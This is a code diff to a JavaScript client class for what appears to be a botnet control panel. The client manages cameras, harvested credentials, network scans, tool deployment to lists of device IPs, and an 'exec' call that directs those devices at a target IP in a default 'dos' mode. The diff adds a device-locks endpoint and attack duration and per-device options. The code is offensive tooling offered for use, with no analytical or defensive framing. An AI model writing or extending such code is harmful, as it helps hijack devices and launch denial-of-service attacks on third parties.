@@ -58,6 +58,7 @@ class LiveClient {
   status()       { return this._get('/status'); }
   cameras()      { return this._get('/cameras'); }
   credentials()  { return this._get('/credentials'); }
+  deviceLocks()  { return this._get('/device-locks'); }
 
   scanStart(scanRange) { return this._post('/scan/start', { scan_range: scanRange }); }
   scanStop()           { return this._post('/scan/stop', {}); }
@@ -71,7 +72,12 @@ class LiveClient {
   deleteBinary(ips, filename)      { return this._post('/delete-binary', { ips, filename }); }
   deleteTools(ips)                 { return this._post('/delete-tools', { ips }); }
 
-  exec(ips, targetIp, args, mode)  { return this._post('/exec', { ips, target_ip: targetIp, args, mode: mode || 'dos' }); }
+  exec(ips, targetIp, args, mode, duration, perDevice) {
+    const body = { ips, target_ip: targetIp, args, mode: mode || 'dos' };
+    if (duration > 0) body.duration = duration;
+    if (perDevice) body.per_device = perDevice;
+    return this._post('/exec', body);
+  }
   execStop(ips)                    { return this._post('/exec/stop', { ips: ips || undefined }); }
 
   saveCred(entry)                  { return this._post('/credentials', { entry }); }
